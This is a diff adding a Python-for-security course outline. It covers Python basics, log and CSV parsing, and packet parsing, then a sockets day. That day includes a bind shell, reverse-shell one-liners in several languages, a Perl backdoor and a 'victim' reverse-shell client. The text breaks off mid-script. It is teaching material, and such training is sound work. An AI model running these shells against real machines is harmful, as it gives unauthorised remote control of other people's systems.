@@ -1,0 +1,5568 @@
+#########################################
+# Here is the courseware for this month #
+#########################################
+
+Class powerpoint slides:
+https://s3.amazonaws.com/infosecaddictsfiles/PythonV3-1.pptx
+
+
+
+Courseware Lab Manual
+https://s3.amazonaws.com/infosecaddictsfiles/Python-For-InfoSec-Pros-2015.pdf
+
+
+Class Videos:
+https://s3.amazonaws.com/infosecaddictsvideos/2017-07-31+09.32+Python+for+InfoSec+Professionals.mp4
+https://s3.amazonaws.com/infosecaddictsvideos/2017-08-01+09.40+Python+for+InfoSec+Professionals.mp4
+https://s3.amazonaws.com/infosecaddictsvideos/2017-08-02+09.37+Python+for+InfoSec+Professionals.mp4
+https://s3.amazonaws.com/infosecaddictsvideos/2017-08-03+10.29+Python+for+InfoSec+Professionals.mp4
+
+
+Resource files:
+https://s3.amazonaws.com/infosecaddictsfiles/Python4SecurityPros-Files.zip
+
+https://s3.amazonaws.com/infosecaddictsvirtualmachines/InfoSecAddictsVM.zip
+user: infosecaddicts
+pass: infosecaddicts
+
+
+
+
+The youtube video playlist that I'd like for you to watch is located here:
+https://www.youtube.com/playlist?list=PLEA1FEF17E1E5C0DA
+
+
+How I did it:
+
+Step 1: Watch and do the newboston Python video series twice
+https://www.youtube.com/playlist?list=PLEA1FEF17E1E5C0DA
+
+
+Step 2:  Watch and do the Google Python workshop twice
+https://www.youtube.com/playlist?list=PLfZeRfzhgQzTMgwFVezQbnpc1ck0I6CQl
+
+
+Step 3: Download all of the Python tools from PacketStorm and analyze the source code
+https://packetstormsecurity.com/files/tags/python
+
+
+Here is the code from Packet Storm
+https://s3.amazonaws.com/infosecaddictsfiles/PythonReferenceCode.zip
+
+I went through almost every single file and looked up the code that I didn't understand.
+I also asked programmers to help me understand the lines of code that didn't make sense.
+In the folder  RAC-Brute I actually had to hire a developer from an outsourcing website to comment,
+and explain the tool to me.
+
+Here is what I got out of doing that:
+https://s3.amazonaws.com/infosecaddictsfiles/sorted-commented-python-files.zip
+
+
+
+Distilled that into this:
+https://s3.amazonaws.com/infosecaddictsfiles/Python-Courseware.zip
+
+
+
+                            ##############################
+----------- ############### # Day 1: Python Fundamentals # ############### -----------
+                            ##############################
+
+
+####################
+# Installing Python#
+####################
+Windows
+32-Bit Version
+http://www.python.org/ftp/python/2.7.5/python-2.7.5.msi
+
+64-Bit Version
+http://www.python.org/ftp/python/2.7.5/python-2.7.5.amd64.msi
+
+After you install Python in Windows the next thing you may want to install is IdleX:
+http://idlex.sourceforge.net/features.html
+
+---------------------------Type This-----------------------------------
+
+Linux
+Debian/Ubuntu:		sudo apt-get install -y python
+RHEL/CentOS/Fedora:	sudo yum install -y python 
+
+-----------------------------------------------------------------------
+
+
+After you install Python in Linux the next thing that you will need to do is install idle. 
+
+---------------------------Type This-----------------------------------
+
+sudo apt-get install -y idle
+
+-----------------------------------------------------------------------
+
+Open IDLE, and let's just dive right in.
+
+
+
+
+#############################
+# Lesson 1: Simple Printing #
+#############################
+
+---------------------------Type This-----------------------------------
+
+>>> print "Today we are learning Python."
+
+-----------------------------------------------------------------------
+
+
+
+
+#####################################
+# Lesson 2: Simple Numbers and Math #
+#####################################
+
+---------------------------Type This-----------------------------------
+
+>>> 2+2
+
+>>> 6-3
+
+>>> 18/7
+
+>>> 18.0/7
+
+>>> 18.0/7.0
+
+>>> 18/7
+
+>>> 9%4
+
+>>> 8%4
+
+>>> 8.75%.5
+
+>>> 6.*7
+
+>>> 6*6*6
+
+>>> 6**3
+
+>>> 5**12
+
+>>> -5**4
+
+
+-----------------------------------------------------------------------
+
+
+
+#######################
+# Lesson 3: Variables #
+#######################
+
+---------------------------Type This-----------------------------------
+
+>>> x=18
+
+>>> x+15
+
+>>> x**3
+
+>>> y=54
+
+>>> x+y
+
+>>> g=input("Enter number here: ")
+	43
+
+>>> g+32
+
+>>> g**3
+
+
+-----------------------------------------------------------------------
+
+
+
+
+
+###################################
+# Lesson 4: Modules and Functions #
+###################################
+
+---------------------------Type This-----------------------------------
+
+>>> 5**4
+
+>>> pow(5,4)
+
+>>> abs(-18)
+
+>>> abs(5)
+
+>>> floor(18.7)
+
+>>> import math
+
+>>> math.floor(18.7)
+
+>>> math.sqrt(81)
+
+>>> joe = math.sqrt
+
+>>> joe(9)
+
+>>> joe=math.floor
+
+>>> joe(19.8)
+
+
+
+-----------------------------------------------------------------------
+
+
+
+##################################
+# Lesson 5: How to Save Programs #
+##################################
+Run "IDLE (Python GUI)"
+
+File -> New Window
+
+---------------------------Type This-----------------------------------
+
+print "Python for InfoSec"
+
+-----------------------------------------------------------------------
+
+File -> Save as 
+	py4InfoSec.py
+
+Run -> Run Module or Press "F5"
+
+
+
+
+
+Create a file name.py
+
+---------------------------Type This-----------------------------------
+
+
+x = raw_input("Enter name: ")
+print "Hey " + x
+raw_input("Press<enter>")
+
+-----------------------------------------------------------------------
+
+Run -> Run Module or Press "F5"
+
+
+
+
+
+
+
+
+#####################
+# Lesson 6: Strings #
+#####################
+
+---------------------------Type This-----------------------------------
+
+
+>>> "XSS"
+
+>>> 'SQLi'
+
+>>> "Joe's a python lover"
+
+>>> 'Joe\'s a python lover'
+
+>>> "Joe said \"InfoSec is fun\" to me"
+
+>>> a = "Joe"
+
+>>> b = "McCray"
+
+>>> a, b
+
+>>> a+b
+
+
+-----------------------------------------------------------------------
+
+
+
+
+
+##########################
+# Lesson 7: More Strings #
+##########################
+
+---------------------------Type This-----------------------------------
+
+
+>>> num = 10
+
+>>> num + 2
+
+>>> "The number of open ports found on this system is " + num
+
+>>> num = str(18)
+
+>>> "There are " + num + " vulnerabilities found in this environment."
+
+>>> num2 = 46
+
+>>> "As of 08/20/2012, the number of states that enacted the Security Breach Notification Law is " + `num2`
+
+
+-----------------------------------------------------------------------
+
+
+
+
+
+#######################
+# Lesson 8: Raw Input #
+#######################
+Run "IDLE (Python GUI)"
+
+File -> New Window
+
+---------------------------Type This-----------------------------------
+
+joemccray=input("Enter name: ")
+print joemccray
+
+-----------------------------------------------------------------------
+
+Run -> Run Module				# Will throw an error
+	or
+Press "F5"
+
+File -> New Window
+
+---------------------------Type This-----------------------------------
+
+joemccray=raw_input("Enter name: ")
+
+-----------------------------------------------------------------------
+
+Run -> Run Module				# Will throw an error
+
+	or
+
+Press "F5"
+
+NOTE: 
+Use "input() for integers and expressions, and use raw_input() when you are dealing with strings.
+
+
+
+
+
+
+
+#################################
+# Lesson 9: Sequences and Lists #
+#################################
+
+---------------------------Type This-----------------------------------
+
+>>> attacks = ['Stack Overflow', 'Heap Overflow', 'Integer Overflow', 'SQL Injection', 'Cross-Site Scripting', 'Remote File Include']
+
+>>> attacks
+['Stack Overflow', 'Heap Overflow', 'Integer Overflow', 'SQL Injection', 'Cross-Site Scripting', 'Remote File Include']
+
+>>> attacks[3]
+'SQL Injection'
+
+>>> attacks[-2]
+'Cross-Site Scripting'
+
+-----------------------------------------------------------------------
+
+
+
+
+##########################
+# Level 10: If Statement #
+##########################
+Run "IDLE (Python GUI)"
+
+File -> New Window
+
+---------------------------Type This-----------------------------------
+
+attack="SQLI"
+if attack=="SQLI":
+	print 'The attacker is using SQLI'
+
+-----------------------------------------------------------------------
+
+Run -> Run Module 	or 	Press "F5"
+
+File >> New Window
+
+---------------------------Type This-----------------------------------
+
+attack="XSS"
+if attack=="SQLI":
+	print 'The attacker is using SQLI'
+
+-----------------------------------------------------------------------
+
+Run -> Run Module 	or 	Press "F5"
+
+
+
+
+####################################
+# Lesson 11: Intro to Log Analysis #
+####################################
+
+
+Log into your Linux host then execute the following commands:
+-----------------------------------------------------------------------
+NOTE: If you are still in your python interpreter then you must type exit() to get back to a regular command-prompt.
+
+---------------------------Type This-----------------------------------
+
+wget http://pastebin.com/raw/85zZ5TZX
+
+mv 85zZ5TZX access_log
+
+
+cat access_log | grep 141.101.80.188
+
+cat access_log | grep 141.101.80.187
+
+cat access_log | grep 108.162.216.204
+
+cat access_log | grep 173.245.53.160
+
+----------------------------------------------------------------------
+
+Google the following terms:
+	- Python read file
+	- Python read line
+	- Python read from file
+
+
+
+
+########################################################
+# Lesson 12: Use Python to read in a file line by line #
+########################################################
+
+
+Reference:
+http://cmdlinetips.com/2011/08/three-ways-to-read-a-text-file-line-by-line-in-python/
+
+
+
+---------------------------Type This-----------------------------------
+
+nano logread1.py
+
+
+---------------------------Paste This-----------------------------------
+## Open the file with read only permit
+f = open('access_log', "r")
+
+## use readlines to read all lines in the file
+## The variable "lines" is a list containing all lines
+lines = f.readlines()
+
+print lines
+
+
+## close the file after reading the lines.
+f.close()
+
+----------------------------------------------------------------------
+
+
+Google the following:
+	- python difference between readlines and readline
+	- python readlines and readline
+
+
+
+
+
+################################
+# Lesson 13: A quick challenge #
+################################
+
+Can you write an if/then statement that looks for this IP and print "Found it"? 
+
+
+141.101.81.187
+
+
+
+
+
+
+---------------------------------------------------------
+Hint 1: Use Python to look for a value in a list
+
+Reference:
+http://www.wellho.net/mouth/1789_Looking-for-a-value-in-a-list-Python.html
+
+
+
+
+---------------------------------------------------------
+Hint 2: Use Python to prompt for user input
+
+Reference:
+http://www.cyberciti.biz/faq/python-raw_input-examples/
+
+
+
+
+---------------------------------------------------------
+Hint 3: Use Python to search for a string in a list
+
+Reference:
+http://stackoverflow.com/questions/4843158/check-if-a-python-list-item-contains-a-string-inside-another-string
+
+
+
+
+
+Here is my solution:
+
+---------------------------Type This-----------------------------------
+
+$ python
+>>> f = open('access_log', "r")
+>>> lines = f.readlines()
+>>> ip = '141.101.81.187'
+>>> for string in lines:
+...	    if ip in string:
+... 		    print(string)
+
+----------------------------------------------------------------------
+
+
+Here is one student's solution - can you please explain each line of this code to me?
+
+
+---------------------------Type This-----------------------------------
+exit()
+nano ip_search.py
+
+---------------------------Paste This-----------------------------------
+#!/usr/bin/python
+
+f = open('access_log')
+
+strUsrinput = raw_input("Enter IP Address: ")
+
+for line in iter(f):
+    ip = line.split(" - ")[0]
+    if ip == strUsrinput:
+        print line
+
+f.close()
+
+----------------------------------------------------------------------
+
+
+
+
+Working with another student after class we came up with another solution:
+
+---------------------------Type This-----------------------------------
+nano ip_search2.py
+
+---------------------------Paste This-----------------------------------
+#!/usr/bin/env python
+ 
+ 
+# This line opens the log file
+f=open('access_log',"r")
+ 
+# This line takes each line in the log file and stores it as an element in the list
+lines = f.readlines()
+ 
+ 
+# This lines stores the IP that the user types as a var called userinput
+userinput = raw_input("Enter the IP you want to search for: ")
+ 
+ 
+ 
+# This combination for loop and nested if statement looks for the IP in the list called lines and prints the entire line if found.
+for ip in lines:
+    if ip.find(userinput) != -1:
+        print ip
+
+----------------------------------------------------------------------
+
+
+
+---------------------------Type This-----------------------------------
+exit()
+----------------------------------------------------------------------
+
+
+
+##################################################
+# Lession 14: Look for web attacks in a log file #
+##################################################
+
+In this lab we will be looking at the scan_log.py script and it will scan the server log to find out common hack attempts within your web server log.
+Supported attacks:
+1.	    SQL Injection
+2.	    Local File Inclusion
+3.	    Remote File Inclusion
+4.	    Cross-Site Scripting
+
+
+---------------------------Type This-----------------------------------
+
+wget https://s3.amazonaws.com/infosecaddictsfiles/scan_log.py
+
+----------------------------------------------------------------------
+
+The usage for scan_log.py is simple.  You feed it an apache log file.
+
+---------------------------Type This-----------------------------------
+
+cat scan_log.py | less			(use your up/down arrow keys to look through the file)
+
+----------------------------------------------------------------------
+
+Explain to me how this script works.
+
+
+
+################################
+# Lesson 15: Parsing CSV Files #
+################################
+
+Dealing with csv files
+
+Reference:
+http://www.pythonforbeginners.com/systems-programming/using-the-csv-module-in-python/
+
+Type the following commands:
+---------------------------------------------------------------------------------------------------------
+
+---------------------------Type This-----------------------------------
+
+wget https://s3.amazonaws.com/infosecaddictsfiles/class_nessus.csv
+
+----------------------------------------------------------------------
+
+Example 1 - Reading CSV files
+-----------------------------
+#To be able to read csv formated files, we will first have to import the
+#csv module.
+
+
+---------------------------Type This-----------------------------------
+python
+import csv
+with open('class_nessus.csv', 'rb') as f:
+    reader = csv.reader(f)
+    for row in reader:
+        print row
+
+
+----------------------------------------------------------------------
+
+
+
+
+Example 2 - Reading CSV files
+-----------------------------
+
+---------------------------Type This-----------------------------------
+
+vi readcsv.py
+
+
+#!/usr/bin/python
+import csv     				# imports the csv module
+import sys      			# imports the sys module
+
+f = open(sys.argv[1], 'rb') 		# opens the csv file
+try:
+    reader = csv.reader(f)  		# creates the reader object
+    for row in reader:   		# iterates the rows of the file in orders
+        print row    			# prints each row
+finally:
+    f.close()      			# closing
+
+
+
+----------------------------------------------------------------------
+
+
+
+Example 3 - - Reading CSV files
+-------------------------------
+
+---------------------------Type This-----------------------------------
+
+vi readcsv2.py
+
+
+#!/usr/bin/python
+# This program will then read it and displays its contents.
+
+
+import csv
+
+ifile  = open('class_nessus.csv', "rb")
+reader = csv.reader(ifile)
+
+rownum = 0
+for row in reader:
+    # Save header row.
+    if rownum == 0:
+        header = row
+    else:
+        colnum = 0
+        for col in row:
+            print '%-8s: %s' % (header[colnum], col)
+            colnum += 1
+            
+    rownum += 1
+
+ifile.close()
+
+
+----------------------------------------------------------------------
+
+
+
+---------------------------Type This-----------------------------------
+
+python readcsv2.py | less
+
+
+----------------------------------------------------------------------
+
+
+
+
+
+/---------------------------------------------------/    
+--------------------PARSING CSV FILES----------------
+/---------------------------------------------------/
+
+-------------TASK 1------------
+
+---------------------------Type This-----------------------------------
+
+vi readcsv3.py
+
+#!/usr/bin/python
+import csv
+f = open('class_nessus.csv', 'rb')
+try:
+    rownum = 0
+    reader = csv.reader(f)
+    for row in reader:
+         #Save header row.
+        if rownum == 0:
+            header = row
+        else:
+            colnum = 0
+            if row[3].lower() == 'high':
+                print '%-1s: %s     %-1s: %s     %-1s: %s     %-1s: %s' % (header[3], row[3],header[4], row[4],header[5], row[5],header[6], row[6])
+        rownum += 1
+finally:
+    f.close()
+
+
+
+
+
+python readcsv3.py | less
+    
+-------------TASK 2------------
+vi readcsv4.py
+
+#!/usr/bin/python
+import csv
+f = open('class_nessus.csv', 'rb')
+try:
+    print '/---------------------------------------------------/'
+    rownum = 0
+    hosts = {}
+    reader = csv.reader(f)
+    for row in reader:
+        # Save header row.
+        if rownum == 0:
+            header = row
+        else:
+            colnum = 0
+            if row[3].lower() == 'high' and row[4] not in hosts:
+                hosts[row[4]] = row[4]
+                print '%-1s: %s     %-1s: %s     %-1s: %s     %-1s: %s' % (header[3], row[3],header[4], row[4],header[5], row[5],header[6], row[6])
+        rownum += 1
+finally:
+    f.close()
+
+
+python readcsv4.py | less
+
+
+
+
+
+----------------------------------------------------------------------
+
+
+
+
+
+
+
+
+#################################################
+# Lesson 16: Parsing Packets with Python's DPKT #
+#################################################
+The first thing that you will need to do is install dpkt. 
+
+---------------------------Type This-----------------------------------
+
+
+sudo apt-get install -y python-dpkt
+
+----------------------------------------------------------------------
+
+
+
+Now cd to your courseware directory, and the cd into the subfolder '2-PCAP-Parsing/Resources'. 
+Run tcpdump to capture a .pcap file that we will use for the next exercise
+
+---------------------------Type This-----------------------------------
+
+sudo tcpdump -ni eth0 -s0 -w quick.pcap
+
+----------------------------------------------------------------------
+
+--open another command prompt--
+
+---------------------------Type This-----------------------------------
+
+
+wget http://packetlife.net/media/library/12/tcpdump.pdf
+
+----------------------------------------------------------------------
+
+Let's do something simple:
+
+---------------------------Type This-----------------------------------
+
+
+vi quickpcap.py
+--------------------------------------------------------
+
+#!/usr/bin/python
+import dpkt;
+
+# Simple script to read the timestamps in a pcap file
+# Reference: http://superbabyfeng.blogspot.com/2009/05/dpkt-tutorial-0-simple-example-how-to.html
+
+f = open("quick.pcap","rb")
+pcap = dpkt.pcap.Reader(f)
+
+for ts, buf in pcap:
+	print ts;
+
+f.close();
+
+
+----------------------------------------------------------------------
+
+
+Now let's run the script we just wrote
+
+---------------------------Type This-----------------------------------
+
+python quickpcap.py
+
+----------------------------------------------------------------------
+
+
+
+How dpkt breaks down a packet:
+
+Reference:
+http://superbabyfeng.blogspot.com/2009/05/dpkt-tutorial-1-dpkt-sub-modules.html
+
+    src: the MAC address of SOURCE.
+    dst: The MAC address of DESTINATION
+    type: The protocol type of contained ethernet payload.
+
+The allowed values are listed in the file "ethernet.py",
+such as:
+a) ETH_TYPE_IP: It means that the ethernet payload is IP layer data.
+b) ETH_TYPE_IPX: Means that the ethernet payload is IPX layer data.
+
+
+References:
+http://stackoverflow.com/questions/6337878/parsing-pcap-files-with-dpkt-python
+
+
+
+
+
+
+Ok - now let's have a look at pcapparsing.py
+
+---------------------------Type This-----------------------------------
+
+
+sudo tcpdump -ni eth0 -s0 -w capture-100.pcap
+
+----------------------------------------------------------------------
+
+--open another command prompt--
+
+---------------------------Type This-----------------------------------
+
+
+wget http://packetlife.net/media/library/13/Wireshark_Display_Filters.pdf
+
+----------------------------------------------------------------------
+
+
+Ok - now let's have a look at pcapparsing.py
+--------------------------------------------------------
+---------------------------Type This-----------------------------------
+
+import socket
+import dpkt
+import sys
+f = open('capture-100.pcap','r')
+pcapReader = dpkt.pcap.Reader(f)
+
+for ts,data in pcapReader:
+    ether = dpkt.ethernet.Ethernet(data)
+    if ether.type != dpkt.ethernet.ETH_TYPE_IP: raise
+    ip = ether.data
+    tcp = ip.data
+    src = socket.inet_ntoa(ip.src)
+    srcport = tcp.sport
+    dst = socket.inet_ntoa(ip.dst)
+    dstport = tcp.dport
+    print "src: %s (port : %s)-> dest: %s (port %s)" % (src,srcport ,dst,dstport)
+
+f.close()
+
+----------------------------------------------------------------------
+
+
+
+OK - let's run it:
+
+---------------------------Type This-----------------------------------
+
+python pcapparsing.py
+
+----------------------------------------------------------------------
+
+
+running this script might throw an error like this:
+
+Traceback (most recent call last):
+  File "pcapparsing.py", line 9, in <module>
+    if ether.type != dpkt.ethernet.ETH_TYPE_IP: raise
+
+
+If it does it is just because your packet has something in it that we didn't specify (maybe ICMP, or something)
+
+
+
+
+Your homework for today...
+
+
+Rewrite this pcapparsing.py so that it prints out the timestamp, the source and destination IP addresses, and the source and destination ports.
+
+
+
+
+
+
+Your challenge is to fix the Traceback error
+
+---------------------------Type This-----------------------------------
+
+
+
+#!/usr/bin/python
+
+import pcapy
+import dpkt
+import sys
+import socket
+import struct
+
+SINGLE_SHOT = False
+
+# list all the network devices
+pcapy.findalldevs()
+
+iface = "eth0"
+filter = "arp"
+max_bytes = 1024
+promiscuous = False
+read_timeout = 100 # in milliseconds
+
+pc = pcapy.open_live( iface, max_bytes, promiscuous, read_timeout )
+pc.setfilter( filter )
+
+# callback for received packets
+def recv_pkts( hdr, data ):
+    packet = dpkt.ethernet.Ethernet( data )
+
+    print type( packet.data )
+    print "ipsrc: %s, ipdst: %s" %( \
+                 socket.inet_ntoa( packet.data.spa ), \
+                 socket.inet_ntoa( packet.data.tpa ) )
+
+    print "macsrc: %s, macdst: %s " % (
+                "%x:%x:%x:%x:%x:%x" % struct.unpack("BBBBBB",packet.data.sha),
+                "%x:%x:%x:%x:%x:%x" % struct.unpack("BBBBBB",packet.data.tha ) )
+
+if SINGLE_SHOT:
+    header, data = pc.next()
+    sys.exit(0)
+else:
+    packet_limit = -1 # infinite
+    pc.loop( packet_limit, recv_pkts ) # capture packets
+
+----------------------------------------------------------------------
+
+
+##################################
+# Day 1 Homework videos to watch #
+##################################
+Here is your first set of youtube videos that I'd like for you to watch:
+https://www.youtube.com/playlist?list=PLEA1FEF17E1E5C0DA (watch videos 1-10)
+
+
+########################
+# Day 1 Challenge task #
+########################
+Rewrite this pcapparsing.py so that it prints out the timestamp, the source and destination IP addresses, and the source and destination ports.
+
+Running the current version of the script may give you an error like this:
+
+Traceback (most recent call last):
+  File "pcapparsing.py", line 9, in <module>
+    if ether.type != dpkt.ethernet.ETH_TYPE_IP: raise
+
+
+If it does it is just because your packet has something in it that we didn't specify (maybe ICMP, or something)
+
+Your challenge task is to fix the Traceback error
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                            #################################
+----------- ############### # Day 2: Python sockets & Scapy # ############### -----------
+                            #################################
+
+
+
+
+
+#############################################
+# Lesson 17: Python Sockets & Port Scanning #
+#############################################
+
+---------------------------Type This-----------------------------------
+
+$ sudo /sbin/iptables -F
+
+$ ncat -l -v -p 1234
+
+----------------------------------------------------------------------
+
+
+
+--open another terminal--
+
+---------------------------Type This-----------------------------------
+
+python
+
+>>> import socket
+>>> s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+>>> s.connect(('localhost', 1234))
+>>> s.send('Hello, world')
+>>> data = s.recv(1024)
+>>> s.close()
+
+>>> print 'Received', data
+
+
+----------------------------------------------------------------------
+
+
+
+
+########################################
+# Lesson 18: TCP Client and TCP Server #
+########################################
+
+---------------------------Type This-----------------------------------
+
+
+vi tcpclient.py
+
+
+
+#!/usr/bin/python
+# tcpclient.py
+
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+hostport = ("127.0.0.1", 1337)
+s.connect(hostport)
+s.send("Hello\n")
+buf = s.recv(1024)
+print "Received", buf
+
+
+
+----------------------------------------------------------------------
+
+
+---------------------------Type This-----------------------------------
+
+
+
+
+vi tcpserver.py
+
+
+
+
+
+#!/usr/bin/python
+# tcpserver.py
+
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+hostport = ("", 1337)
+s.bind(hostport)
+s.listen(10)
+while 1:
+	cli,addr = s.accept()
+	print "Connection from", addr
+	buf = cli.recv(1024)
+	print "Received", buf
+	if buf == "Hello\n":
+		cli.send("Server ID 1\n")
+	cli.close()
+
+
+
+
+----------------------------------------------------------------------
+
+
+---------------------------Type This-----------------------------------
+
+
+python tcpserver.py
+
+
+--open another terminal--
+python tcpclient.py
+
+----------------------------------------------------------------------
+
+########################################
+# Lesson 19: UDP Client and UDP Server #
+########################################
+
+---------------------------Type This-----------------------------------
+
+vi udpclient.py
+
+
+
+
+
+
+#!/usr/bin/python
+# udpclient.py
+
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+hostport = ("127.0.0.1", 1337)
+s.sendto("Hello\n", hostport)
+buf = s.recv(1024)
+print buf
+
+
+
+----------------------------------------------------------------------
+
+
+
+
+---------------------------Type This-----------------------------------
+
+
+vi udpserver.py
+
+
+
+
+
+
+#!/usr/bin/python
+# udpserver.py
+
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+hostport = ("127.0.0.1", 1337)
+s.bind(hostport)
+while 1:
+	buf, address = s.recvfrom(1024)
+	print buf
+	if buf == "Hello\n":
+		s.sendto("Server ID 1\n", address)
+
+
+----------------------------------------------------------------------
+
+
+---------------------------Type This-----------------------------------
+
+
+python udpserver.py
+
+
+--open another terminal--
+python udpclient.py
+
+----------------------------------------------------------------------
+
+
+######################################
+# Lesson 20: Bind and Reverse Shells #
+######################################
+
+---------------------------Type This-----------------------------------
+
+
+vi simplebindshell.py
+
+
+#!/bin/python
+import os,sys,socket
+
+ls = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+print '-Creating socket..'
+port = 31337
+try:
+	ls.bind(('', port))
+	print '-Binding the port on ' 
+	ls.listen(1)
+	print '-Listening, '
+	(conn, addr) = ls.accept()
+	print '-Waiting for connection...'
+	cli= conn.fileno()
+	print '-Redirecting shell...'
+	os.dup2(cli, 0)
+	print 'In, '
+	os.dup2(cli, 1)
+	print 'Out, '
+	os.dup2(cli, 2)
+	print 'Err'	
+	print 'Done!'
+	arg0='/bin/sh'
+	arg1='-a'
+	args=[arg0]+[arg1]
+	os.execv(arg0, args)
+except(socket.error):
+	print 'fail\n'
+	conn.close()
+	sys.exit(1)
+
+
+
+
+
+
+
+nc TARGETIP 31337
+
+
+
+---------------------
+Preparing the target for a reverse shell
+$ ncat -lvp 4444
+
+
+
+--open another terminal--
+wget https://www.trustedsec.com/files/simple_py_shell.py
+
+vi simple_py_shell.py
+
+
+
+----------------------------------------------------------------------
+
+
+
+-------------------------------
+Tricky shells
+
+Reference:
+http://securityweekly.com/2011/10/python-one-line-shell-code.html
+http://resources.infosecinstitute.com/creating-undetectable-custom-ssh-backdoor-python-z/
+
+
+
+
+
+Lots of reverse shells in different languages
+---------------------------------------------------------------------
+
+
+
+########
+# Bash #
+########
+
+---------------------------Type This-----------------------------------
+
+
+bash -i >& /dev/tcp/127.0.0.1/8080 0>&1
+
+----------------------------------------------------------------------
+
+
+########
+# Perl #
+########
+
+---------------------------Type This-----------------------------------
+
+
+perl -e 'use Socket;$i="127.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+
+
+cat perlbackdoor.pl
+#!/usr/bin/perl
+use Socket;
+use FileHandle;
+$IP = $ARGV[0];
+$PORT = $ARGV[1];
+socket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname("tcp"));
+connect(SOCKET, sockaddr_in($PORT,inet_aton($IP)));
+SOCKET->autoflush();
+open(STDIN, ">&SOCKET");
+open(STDOUT,">&SOCKET");
+open(STDERR,">&SOCKET");
+system("/bin/sh -i");
+
+----------------------------------------------------------------------
+
+##########
+# Python #
+##########
+
+---------------------------Type This-----------------------------------
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+----------------------------------------------------------------------
+
+#######
+# Php #
+#######
+---------------------------Type This-----------------------------------
+
+php -r '$sock=fsockopen("127.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+----------------------------------------------------------------------
+
+########
+# ruby #
+########
+---------------------------Type This-----------------------------------
+
+ruby -rsocket -e'f=TCPSocket.open("127.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+----------------------------------------------------------------------
+
+
+########
+# Java #
+########
+---------------------------Type This-----------------------------------
+
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+
+
+exec 5<>/dev/tcp/127.0.0.1/1234
+
+
+cat <&5 | while read line; do $line 2>&5 >&5; done
+
+exec 5<>/dev/tcp/127.0.0.1/1234
+
+while read line 0<&5; do $line 2>&5 >&5; done
+0<&196;exec 196<>/dev/tcp/127.0.0.1/1234; sh <&196 >&196 2>&196
+
+----------------------------------------------------------------------
+
+##############
+# Powershell #
+##############
+---------------------------Type This-----------------------------------
+
+powershell -command "function ReverseShellClean {if ($client.Connected -eq $true) {$client.Close()};  if ($process.ExitCode -ne $null) {$process.Close()};  exit;  };$address = '127.0.0.1';  $port = '1234';$client = New-Object system.net.sockets.tcpclient; $client.connect($address,$port) ;$stream = $client.GetStream();$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize  ;$process = New-Object System.Diagnostics.Process  ;$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'  ;$process.StartInfo.RedirectStandardInput = 1  ;$process.StartInfo.RedirectStandardOutput = 1;$process.StartInfo.UseShellExecute = 0  ;$process.Start()  ;$inputstream = $process.StandardInput  ;$outputstream = $process.StandardOutput  ;Start-Sleep 1  ;$encoding = new-object System.Text.AsciiEncoding  ;while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())};$stream.Write($encoding.GetBytes($out),0,$out.Length)  ;$out = $null; $done = $false; $testing = 0; ;while (-not $done) {if ($client.Connected -ne $true) {cleanup}  ;$pos = 0; $i = 1;  while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) { $read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos);  $pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}  ;if ($pos -gt 0){ $string = $encoding.GetString($networkbuffer,0,$pos);  $inputstream.write($string);  start-sleep 1;  if ($process.ExitCode -ne $null) {ReverseShellClean};else {  $out = $encoding.GetString($outputstream.Read()); while($outputstream.Peek() -ne -1){;  $out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}};  $stream.Write($encoding.GetBytes($out),0,$out.length);  $out = $null;  $string = $null}} else {ReverseShellClean}};"
+
+
+
+----------------------------------------------------------------------
+
+
+
+
+
+###############################
+# Reverse Shell in Python 2.7 #
+###############################
+
+We'll create 2 python files. One for the server and one for the client.
+
+- Below is the python code that is running on victim/client Windows machine:
+
+---------------------------Type This-----------------------------------
+
+# Client
+
+import socket # For Building TCP Connection
+import subprocess # To start the shell in the system
+
+def connect():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(('192.168.243.150',8080))
+
+    while True:                         #keep receiving commands
+        command = s.recv(1024)
+
+        if 'terminate' in command:
+            s.close() #close the socket
+            break
+
+        else:
+
+            CMD = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            s.send( CMD.stdout.read()  )  # send the result
+            s.send( CMD.stderr.read()  )  # incase you mistyped a command.
+            # we will send back the error
+
+def main ():
+    connect()
+main()
+
+
+----------------------------------------------------------------------
+
+- Below is the code that we should run on server unit, in our case InfosecAddicts Ubuntu machine ( Ubuntu IP: 192.168.243.150 )
+
+---------------------------Type This-----------------------------------
+
+# Server
+
+import socket # For Building TCP Connection
+
+
+def connect ():
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(("192.168.243.150", 8080))
+    s.listen(1)
+    conn, addr = s.accept()
+    print '[+] We got a connection from:  ', addr
+
+
+    while True:
